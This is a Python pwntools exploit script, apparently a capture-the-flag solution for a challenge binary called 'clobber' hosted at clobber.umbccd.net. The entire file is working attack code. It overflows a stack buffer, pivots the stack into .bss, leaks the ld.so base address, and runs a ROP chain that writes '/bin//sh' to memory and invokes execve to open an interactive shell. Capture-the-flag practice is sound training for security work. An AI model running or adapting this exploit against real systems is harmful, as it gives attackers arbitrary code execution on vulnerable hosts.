from pwn import *

gs = '''
b *main+84
b *main+107
continue
'''

elf = context.binary = ELF("./clobber")
libc = ELF("./libc.so.6")
ld = ELF("./ld.so")

def start():
    if args.REMOTE:
        return remote("clobber.umbccd.net", 13373)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

pop_rbp = 0x000000000040115d
offset = 40
call_gets = elf.sym.main + 72
leave_ret = 0x00000000004011e0
bss_address = 0x0000000000404040
ret = 0x00000000004011e1
call_puts = elf.sym.main + 89

payload = b"".join([
    b"A"*offset,
    p64(pop_rbp),
    p64(0x404060 + 256),
    p64(call_gets)
])
#input("PAUSE")
io.sendline(payload)

payload = b"".join([
    b"B"*32,
    p64(0x404160 + 2 + 0x20),
    p64(call_puts),
    #cyclic(128)
    b"C"*26,
    #b"C"*128
    p64(elf.sym.main)
])

io.sendline(payload)

io.recvline()
io.recvline()
leak_ld = int(hex(u64(io.recvline().strip().ljust(8, b"\x00")) << 12) + "0", 16)
print(f"Leak Ld: {hex(leak_ld)}")

ld.address = leak_ld - 0x2d000# - int(input("diff: "))

print(f"Ld base: {hex(ld.address)}")

rop = ROP(ld)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
syscall = rop.find_gadget(['syscall'])[0]
mov_qword_ptr_rsi_rax = ld.address + 0x00000000000123a5 # mov qword ptr [rsi], rax ; ret
data_address = 0x0000000000404018
pop_rdx = ld.address + 0x000000000001c933 # pop rdx ; pop rbx ; ret

print(f"pop rax ; ret : {hex(pop_rax)}")

payload = b"".join([
    b"A"*offset,
    p64(pop_rax),
    b"/bin//sh",
    p64(pop_rsi),
    p64(data_address),
    p64(mov_qword_ptr_rsi_rax),
    #p64(elf.sym.main)
    p64(pop_rdx),
    p64(0x0),
    p64(0x0),
    p64(pop_rdi),
    p64(data_address),
    p64(pop_rsi),
    p64(data_address + 0x8),
    p64(pop_rax),
    p64(0x3b),
    p64(syscall)
])

io.sendline(payload)

io.interactive()